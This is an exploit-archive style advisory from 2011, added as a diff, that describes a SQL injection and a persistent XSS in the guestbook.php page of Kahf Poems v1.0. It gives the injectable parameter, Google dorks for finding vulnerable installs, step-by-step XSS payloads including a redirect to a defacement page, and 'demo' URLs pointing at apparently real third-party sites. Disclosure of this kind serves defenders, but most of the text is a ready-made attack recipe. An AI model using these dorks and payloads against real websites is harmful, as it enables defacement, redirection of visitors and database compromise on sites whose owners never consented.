@@ -1,0 +1,67 @@
+################################################################################################
+[+] Title            : Kahf Poems V1.0 (guestbook.php) SQL Injection
+[+] Name             : Kahf Poems
+[+] Affected Version : v1.0
+[+] Software Link    : http://www.traidnt.net/vb/traidnt19736/
+[+] Tested on        : (L):Vista & Windows Xp and Windows 7
+[+] Date             : 13/08/2011
+[+] Dork             : "intitle:Kahf Poems -> v 1.0 beta"  &   "inurl:guestbook.php?diwan_id="
+#################################################################################################
+[+] Author           : Yassin Aboukir
+[+] Contact          : 01Xp01@Gmail.com
+[+] Site             : http://www.yaboukir.com
+#################################################################################################
+
+
+[+] Error        : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\',10' at line 1
+
+[+] How to exploit :
+
+http://localhost/Path/guestbook.php?diwan_id=8&action=view&offset=1[SQL HERE]
+
+[+] Fix : upgrade to last release (v3)
+
+
+[+] Special Thanks to Ayoub Aboukir & All Friends ...
+
+[+] Demos : 
+http://www.yaaam.com/poems/guestbook.php?diwan_id=8&action=view&offset=1'
+http://www.yaaam.com/poems/guestbook.php?diwan_id=8&action=view&offset=5860'
+
+################################################################################################
+[+] Title            : Kahf Poems V1.0 (guestbook.php) Persistent XSS
+[+] Name             : Kahf Poems
+[+] Affected Version : v1.0
+[+] Software Link    : http://www.traidnt.net/vb/traidnt19736/
+[+] Tested on        : (L):Vista & Windows Xp and Windows 7
+[+] Date             : 13/08/2011
+[+] Dork             : "intitle:Kahf Poems -> v 1.0 beta"  &   "inurl:guestbook.php?diwan_id="
+#################################################################################################
+[+] Author           : Yassin Aboukir
+[+] Contact          : 01Xp01@Gmail.com
+[+] Site             : http://www.yaboukir.com
+#################################################################################################
+
+[+] Details        : Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications that enables attackers to inject client-side script into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same origin policy.
+
+[+] How to exploit :
+
+1- Go there : http://localhost/Path/guestbook.php?action=addnew&diwan_id=1 .
+
+2- Put in Body field the XSS Code.
+Example 1: <META http-equiv="refresh" content="0;URL=http://www.Deface-page.com">  .
+Example 2: <script>alert('Xssed by The W0rm')</script>
+
+3- Put anything in the other field ( Name & E-mail).
+
+4- Now anyone go to the guestbook page will redirected to your own paege OR exploit your XSS Code.
+
+
+[+] Fix : upgrade to last release.
+
+
+[+] Special Thanks to Ayoub Aboukir & All Friends ...
+
+[+] Demos : 
+http://www.yaaam.com/poems/guestbook.php?diwan_id=1&action=view&offset=0
+http://www.alalarja.com/poems/guestbook.php?diwan_id=1&action=view&offset=0
